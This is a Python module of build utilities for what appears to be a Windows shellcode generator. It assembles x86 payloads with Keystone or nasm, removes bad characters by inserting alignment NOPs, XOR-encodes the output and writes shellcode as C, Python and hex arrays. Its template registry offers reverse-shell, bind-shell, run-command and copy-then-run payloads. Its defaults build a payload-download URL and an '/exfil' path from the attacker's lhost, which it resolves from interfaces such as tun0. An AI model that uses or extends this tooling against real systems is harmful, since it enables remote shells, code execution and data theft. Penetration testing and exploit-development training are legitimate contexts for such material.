"""Arch-independent build utilities shared by x86 and x64 orchestrators.

Extracted from build.py to eliminate the circular import where build_x64.py
imported utilities from build.py. Both orchestrators now import from here.
"""
from __future__ import annotations

import importlib
import os
import pathlib
import re
import shutil
import subprocess
import sys
import tempfile
from dataclasses import dataclass
from datetime import UTC, datetime

from .api_database import API_DATABASE, MODULE_LOAD_ORDER, STRUCT_DATABASE
from .payload_templates.base import PayloadTemplate, TemplateConfig
from .schema import Manifest, StringEntry, VariableEntry


# ---------------------------------------------------------------------------
# Build timestamp
# ---------------------------------------------------------------------------


def _build_timestamp() -> str:
    """Return a build timestamp. Reproducible by default (epoch 0).

    Set SOURCE_DATE_EPOCH to a Unix timestamp for a specific date,
    or SOURCE_DATE_EPOCH=now for a wall-clock timestamp.
    """
    epoch = os.environ.get("SOURCE_DATE_EPOCH", "0")
    if epoch.lower() == "now":
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    dt = datetime.fromtimestamp(int(epoch), tz=UTC)
    return dt.strftime("%Y-%m-%d %H:%M:%S")


# ---------------------------------------------------------------------------
# BuildResult
# ---------------------------------------------------------------------------


@dataclass
class BuildResult:
    manifest_path: str
    asm: str
    contract_md: str
    shellcode_bytes: bytes | None = None
    hex_str: str | None = None
    py_bytes: str | None = None
    c_array: str | None = None
    test_harness: str | None = None
    debug_runner: str | None = None
    code_snippet: str | None = None
    layout: object | None = None
    assembler: str | None = None
    asm_errors: list[str] | None = None
    encoded_bytes: bytes | None = None
    encoder_report: str | None = None
    xor_wrapper: str | None = None


# ---------------------------------------------------------------------------
# Byte formatting
# ---------------------------------------------------------------------------


def _bytes_to_hex_str(raw: bytes) -> str:
    chunks = [raw[i:i + 16] for i in range(0, len(raw), 16)]
    return "\n".join("".join(f"\\x{b:02x}" for b in chunk) for chunk in chunks)


def _bytes_to_py(raw: bytes) -> str:
    chunks = [raw[i:i + 16] for i in range(0, len(raw), 16)]
    lines = [f'b"{"".join(f"\\x{b:02x}" for b in chunk)}"' for chunk in chunks]
    body = "\n".join(lines)
    return f"shellcode = (\n{body}\n)\n# Length: {len(raw)} bytes"


def _bytes_to_c(raw: bytes) -> str:
    hex_bytes = [f"0x{b:02x}" for b in raw]
    rows = [hex_bytes[i:i + 16] for i in range(0, len(hex_bytes), 16)]
    body = "\n".join("    " + ", ".join(row) + "," for row in rows)
    return f"unsigned char shellcode[] = {{\n{body}\n}};\n// Length: {len(raw)} bytes"


# ---------------------------------------------------------------------------
# File I/O
# ---------------------------------------------------------------------------


def _write_text(path: pathlib.Path, data: str) -> None:
    """Write text files as UTF-8 regardless of the host locale."""
    path.write_text(data, encoding="utf-8")


# ---------------------------------------------------------------------------
# Assembly syntax conversion
# ---------------------------------------------------------------------------


def _strip_comments(asm: str) -> str:
    """Strip both # and ; comments so non-ASCII decoration never reaches the assembler."""
    lines = []
    for line in asm.splitlines():
        line = line.split("#")[0]
        line = line.split(";")[0]
        lines.append(line)
    return "\n".join(lines)


def _to_keystone(asm: str) -> str:
    """Convert emitter Intel syntax to Keystone-compatible syntax.

    Keystone already accepts the emitter's internal format with minimal
    changes:
    - Strip # and ; comments
    - 'jmp short' -> 'jmp' (Keystone infers short encoding)
    - Drop blank-only lines (Keystone chokes on trailing whitespace lines)
    """
    lines = []
    for line in asm.splitlines():
        line = line.split("#")[0]
        line = line.split(";")[0]
        line = line.rstrip()
        line = re.sub(r'\bjmp\s+short\b', 'jmp', line)
        if line.strip():
            lines.append(line)
    return "\n".join(lines)


def _to_nasm(asm: str) -> str:
    """Convert emitter Intel syntax to nasm flat-binary syntax.

    Differences handled:
    - Prepend 'BITS 32' so nasm knows the mode
    - Strip # and ; comments (may contain non-ASCII decoration)
    - 'dword/word/byte ptr [...]' -> 'dword/word/byte [...]'
    - 'fs:[...]' -> '[fs:...]'  (segment register syntax)
    """
    lines = ["BITS 32"]
    for line in asm.splitlines():
        line = line.split("#")[0]
        line = line.split(";")[0]
        line = line.rstrip()
        line = re.sub(r'\bfs:\[', '[fs:', line)
        line = re.sub(r'\b(dword|word|byte)\s+ptr\b', r'\1', line, flags=re.IGNORECASE)
        lines.append(line)
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Assembler backends
# ---------------------------------------------------------------------------


def _try_assemble_keystone(asm: str) -> tuple[bytes | None, str | None]:
    """Try keystone. Returns (bytes, None) on success or (None, error_msg)."""
    try:
        import keystone
    except ImportError:
        return None, None
    try:
        ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
        encoding, _ = ks.asm(_strip_comments(asm))
        return bytes(encoding), None
    except Exception as e:
        return None, f"keystone: {e}"


def _try_assemble_nasm(asm: str) -> tuple[bytes | None, str | None]:
    """Try nasm. Returns (bytes, None) on success or (None, error_msg)."""
    if not shutil.which("nasm"):
        return None, None
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            src = pathlib.Path(tmpdir) / "shellcode.asm"
            out = pathlib.Path(tmpdir) / "shellcode.bin"
            _write_text(src, _to_nasm(asm))
            result = subprocess.run(
                ["nasm", "-f", "bin", "-o", str(out), str(src)],
                capture_output=True,
                text=True,
            )
            if result.returncode != 0:
                return None, f"nasm: {result.stderr.strip()}"
            return out.read_bytes(), None
    except Exception as e:
        return None, f"nasm: {e}"


def _try_assemble(asm: str) -> tuple[bytes, str, list[str]] | tuple[None, None, list[str]]:
    """Try keystone, then nasm. Returns (bytes, assembler_name, errors) or (None, None, errors)."""
    errors: list[str] = []
    raw, err = _try_assemble_keystone(asm)
    if raw is not None:
        return raw, "keystone", errors
    if err:
        errors.append(err)
    raw, err = _try_assemble_nasm(asm)
    if raw is not None:
        return raw, "nasm", errors
    if err:
        errors.append(err)
    return None, None, errors


def _check_badchars(raw: bytes, badchars: set[int]) -> list[str]:
    """Scan assembled shellcode for badchar violations. Returns error messages."""
    violations: list[str] = []
    for i, byte in enumerate(raw):
        if byte in badchars:
            ctx_start = max(0, i - 2)
            ctx_end = min(len(raw), i + 3)
            ctx = raw[ctx_start:ctx_end].hex()
            violations.append(
                f"BADCHAR 0x{byte:02x} at offset {i} (context: {ctx})"
            )
    if violations:
        summary = f"[!] {len(violations)} badchar violation(s) in {len(raw)} bytes"
        return [summary] + violations
    return []


def _call_disp_has_badchar(raw: bytes, badchars: set[int]) -> bool:
    """Return True if any CALL rel32 displacement byte is in badchars."""
    for i in range(len(raw) - 4):
        if raw[i] == 0xe8:
            if any(raw[i + k] in badchars for k in range(1, 5)):
                return True
    return False


def _assemble_aligned(
    asm: str, badchars: set[int], max_nops: int = 64,
) -> tuple[bytes | None, str | None, str, list[str]]:
    """Try assembling with 0..max_nops alignment NOPs before main.

    CALL rel32 displacement bytes can land on a forbidden value purely due to
    code layout.  Adding NOP instructions before main shifts every caller in
    main by one byte without moving the callee labels, changing all
    relative displacements by exactly one, so a small linear search finds the
    first clean count.

    Only call-displacement bytes are checked here; content badchars (literal
    bytes in the payload) are handled separately by build().

    Returns (bytes, assembler_name, asm_with_nops, errors).
    """
    _PLACEHOLDER = "; __ALIGNMENT_NOPS__"
    for n in range(max_nops + 1):
        nops = "\n".join("    nop" for _ in range(n)) if n > 0 else ""
        candidate = asm.replace(_PLACEHOLDER, nops, 1)
        raw, assembler, errs = _try_assemble(candidate)
        if raw is None:
            return None, None, candidate, errs
        if not _call_disp_has_badchar(raw, badchars):
            return raw, assembler, candidate, []
    return raw, assembler, candidate, []


def _validate_badchars(raw: bytes, badchars: set[int]) -> list[str]:
    """Return diagnostics when assembled bytes contain forbidden values."""
    hits = [(offset, byte) for offset, byte in enumerate(raw) if byte in badchars]
    if not hits:
        return []

    preview = ", ".join(f"0x{offset:04x}=0x{byte:02x}" for offset, byte in hits[:8])
    suffix = "" if len(hits) <= 8 else f" ... ({len(hits)} total)"
    return [f"assembled shellcode contains forbidden bytes: {preview}{suffix}"]


# ---------------------------------------------------------------------------
# Template loading
# ---------------------------------------------------------------------------


def _load_template(name: str) -> PayloadTemplate:
    """Load a payload template by short name."""
    registry = {
        "ir_run_command":  "emitrion.workflow.reference.IRRunCommandTemplate",
        "ir_reverse_shell": "emitrion.workflow.reference.IRReverseShellTemplate",
        "ir_bind_shell":    "emitrion.workflow.reference.IRBindShellTemplate",
        "ir_copy_file":     "emitrion.workflow.reference.IRCopyFileTemplate",
        "ir_copy_then_run": "emitrion.workflow.reference.IRCopyThenRunTemplate",
        "ir_move_then_run": "emitrion.workflow.reference.IRMoveThenRunTemplate",
        "ir_check_path":    "emitrion.workflow.reference.IRCheckPathTemplate",
    }
    if name not in registry:
        raise ValueError(
            f"Unknown template: '{name}'. Available: {sorted(registry.keys())}"
        )
    module_path, cls_name = registry[name].rsplit(".", 1)
    mod = importlib.import_module(module_path)
    cls = getattr(mod, cls_name)
    return cls()


# ---------------------------------------------------------------------------
# CLI override precedence
# ---------------------------------------------------------------------------

_CONFIG_TO_LABELS: dict[str, list[str]] = {
    "command": ["cmd"],
    "src_path": ["src_path"],
    "dst_path": ["dst_path", "check_path"],
    "url": ["url"],
    "url_path": ["url_path"],
    "lhost": ["exfil_host"],
    "process_name": ["process_name"],
    "service_name": ["service_name", "reg_value_name"],
}


def _apply_config_overrides(manifest: Manifest, config: TemplateConfig) -> Manifest:
    """Apply non-None config overrides to manifest strings, then backfill
    any still-None config fields from the manifest.

    Must run before build_layout() because changed string lengths affect
    slot sizes.  Mutates config in place (backfill) and returns a new
    Manifest when any string value changed.
    """
    label_to_field: dict[str, str] = {}
    for field_name, labels in _CONFIG_TO_LABELS.items():
        for label in labels:
            label_to_field[label] = field_name

    overrides: dict[str, str] = {}
    for field_name, labels in _CONFIG_TO_LABELS.items():
        val = getattr(config, field_name)
        if val is not None:
            for label in labels:
                overrides[label] = val

    changed = False
    new_strings: list[StringEntry] = []
    for entry in manifest.strings:
        if entry.label in overrides and overrides[entry.label] != entry.value:
            new_strings.append(StringEntry(
                label=entry.label,
                value=overrides[entry.label],
                method=entry.method,
                dest=entry.dest,
            ))
            changed = True
        else:
            new_strings.append(entry)

    for entry in new_strings:
        field_name = label_to_field.get(entry.label)
        if field_name is not None and getattr(config, field_name) is None:
            setattr(config, field_name, entry.value)

    if config.command is None:
        config.command = "cmd.exe"
    if config.src_path is None:
        config.src_path = "C:\\source.txt"
    if config.dst_path is None:
        config.dst_path = "C:\\dest.txt"
    if config.url is None:
        config.url = f"http://{config.lhost}:{config.lport}/payload.exe"
    if config.url_path is None:
        config.url_path = "/exfil"
    if config.process_name is None:
        config.process_name = "target.exe"
    if config.service_name is None:
        config.service_name = "UpdateSvc"

    if not changed:
        return manifest

    return Manifest(
        badchars=manifest.badchars,
        functions=list(manifest.functions),
        strings=new_strings,
        variables=list(manifest.variables),
        template=manifest.template,
    )


# ---------------------------------------------------------------------------
# Auto-derive template requirements
# ---------------------------------------------------------------------------


def _merge_template_requirements(
    manifest: Manifest,
    template: PayloadTemplate,
    config: TemplateConfig,
) -> Manifest:
    """Probe the template to discover slot references, then return a new
    Manifest with any missing API functions auto-added.

    Classification of each probed slot name:
      - In API_DATABASE         -> function (auto-add if missing)
      - In STRUCT_DATABASE      -> structure (auto-derived from functions)
      - In MODULE_LOAD_ORDER    -> module base (auto-derived from functions)
      - Matches a manifest string label or variable -> already present
      - Otherwise               -> ignored (optional probe or manifest error)

    Variables are not auto-added because the probe cannot distinguish
    required variables from optional slot lookups guarded by try/except.
    Variables must be declared in the manifest YAML.

    Non-kernel32 functions trigger automatic addition of LoadLibraryA.
    """
    probed = template.probe_slots(config)

    existing_funcs = set(manifest.functions)
    existing_vars = {v.name for v in manifest.variables}
    string_labels = {e.label for e in manifest.strings}
    dll_names = {m.dll for m in MODULE_LOAD_ORDER}

    new_funcs: list[str] = []
    new_vars: list[VariableEntry] = []
    new_strings: list[StringEntry] = []

    from emitrion.workflow.reference import WorkflowTemplate
    auto_add_vars = isinstance(template, WorkflowTemplate)

    if auto_add_vars:
        ir_strings = template.probe_strings(config)
        for label, value in ir_strings.items():
            if label not in string_labels:
                new_strings.append(StringEntry(
                    label=label, value=value, method="push",
                ))
                string_labels.add(label)

    ir_struct_names: set[str] = set()
    if auto_add_vars:
        ir_struct_names = set(template.probe_structs(config).keys())

    for name in probed:
        if name in existing_funcs or name in existing_vars or name in string_labels:
            continue
        if name in STRUCT_DATABASE or name in dll_names:
            continue
        if name in ir_struct_names:
            continue
        if name in API_DATABASE:
            new_funcs.append(name)
            existing_funcs.add(name)
        elif auto_add_vars:
            new_vars.append(VariableEntry(name=name))
            existing_vars.add(name)

    all_funcs = list(manifest.functions) + new_funcs
    needs_loadlib = any(
        API_DATABASE[f].module != "kernel32.dll"
        for f in all_funcs
        if f in API_DATABASE
    )
    if needs_loadlib and "LoadLibraryA" not in existing_funcs:
        new_funcs.insert(0, "LoadLibraryA")

    if not new_funcs and not new_vars and not new_strings:
        return manifest

    return Manifest(
        badchars=manifest.badchars,
        functions=list(manifest.functions) + new_funcs,
        strings=manifest.strings + new_strings,
        variables=list(manifest.variables) + new_vars,
        template=manifest.template,
    )


# ---------------------------------------------------------------------------
# XOR wrapper (delegates to build_x64)
# ---------------------------------------------------------------------------


def _generate_xor_wrapper(arch: str, badchars: set[int]) -> str:
    from .build_x64 import generate_xor_wrapper
    return generate_xor_wrapper(arch=arch, badchars=badchars)


# ---------------------------------------------------------------------------
# Output writing
# ---------------------------------------------------------------------------


def write_outputs(result: BuildResult, out_dir: str) -> None:
    """Write all build outputs to out_dir."""
    base = pathlib.Path(out_dir)
    (base / "asm").mkdir(parents=True, exist_ok=True)
    (base / "Documentation").mkdir(parents=True, exist_ok=True)

    _write_text(base / "asm" / "generated.asm", result.asm)
    _write_text(base / "asm" / "debug_runner.py", result.debug_runner)
    if result.code_snippet:
        _write_text(base / "asm" / "code_snippet.py", result.code_snippet)
    _write_text(base / "Documentation" / "contract.md", result.contract_md)

    if result.shellcode_bytes:
        (base / "bin").mkdir(parents=True, exist_ok=True)
        (base / "bin" / "shellcode.bin").write_bytes(result.shellcode_bytes)
        _write_text(base / "bin" / "shellcode.hex", result.hex_str or "")
        _write_text(base / "bin" / "shellcode.py", result.py_bytes or "")
        _write_text(base / "bin" / "shellcode.c", result.c_array or "")
        if result.test_harness:
            _write_text(base / "bin" / "test_harness.py", result.test_harness)
    else:
        for name in (
            "shellcode.bin",
            "shellcode.hex",
            "shellcode.py",
            "shellcode.c",
            "test_harness.py",
        ):
            (base / "bin" / name).unlink(missing_ok=True)

    if result.encoded_bytes:
        (base / "bin").mkdir(parents=True, exist_ok=True)
        (base / "bin" / "shellcode_encoded.bin").write_bytes(result.encoded_bytes)
        _write_text(base / "bin" / "shellcode_encoded.hex", _bytes_to_hex_str(result.encoded_bytes) or "")
        _write_text(base / "bin" / "shellcode_encoded.py", _bytes_to_py(result.encoded_bytes) or "")
        _write_text(base / "bin" / "shellcode_encoded.c", _bytes_to_c(result.encoded_bytes) or "")
    else:
        for name in (
            "shellcode_encoded.bin",
            "shellcode_encoded.hex",
            "shellcode_encoded.py",
            "shellcode_encoded.c",
        ):
            (base / "bin" / name).unlink(missing_ok=True)

    if result.encoder_report:
        _write_text(base / "Documentation" / "encoder_report.txt", result.encoder_report)
    else:
        (base / "Documentation" / "encoder_report.txt").unlink(missing_ok=True)

    if result.xor_wrapper:
        (base / "bin").mkdir(parents=True, exist_ok=True)
        _write_text(base / "bin" / "xor_wrapper.py", result.xor_wrapper)
    else:
        (base / "bin" / "xor_wrapper.py").unlink(missing_ok=True)


# ---------------------------------------------------------------------------
# CLI helpers
# ---------------------------------------------------------------------------


def _resolve_lhost(lhost: str) -> str:
    """Return an IPv4 address for lhost.

    Accepts either a dotted-decimal address or a network interface name
    (e.g. tun0, eth0).  Raises SystemExit with a clear message on failure.
    """
    import socket as _socket

    try:
        _socket.inet_pton(_socket.AF_INET, lhost)
        return lhost
    except OSError:
        pass

    try:
        import fcntl
        import struct
        import sys as _sys
        _SIOCGIFADDR = 0xc0206921 if _sys.platform == "darwin" else 0x8915
        with _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM) as _s:
            ifreq = struct.pack("256s", lhost[:15].encode())
            result = fcntl.ioctl(_s.fileno(), _SIOCGIFADDR, ifreq)
            ip_bytes = result[20:24] if _sys.platform != "darwin" else result[4:8]
            return _socket.inet_ntoa(ip_bytes)
    except ImportError:
        pass
    except OSError as exc:
        print(f"[-] --lhost {lhost!r}: interface not found or has no IPv4 address ({exc})", file=sys.stderr)
        sys.exit(1)

    print(f"[-] --lhost {lhost!r}: not a valid IPv4 address and interface lookup not supported on this platform", file=sys.stderr)
    sys.exit(1)
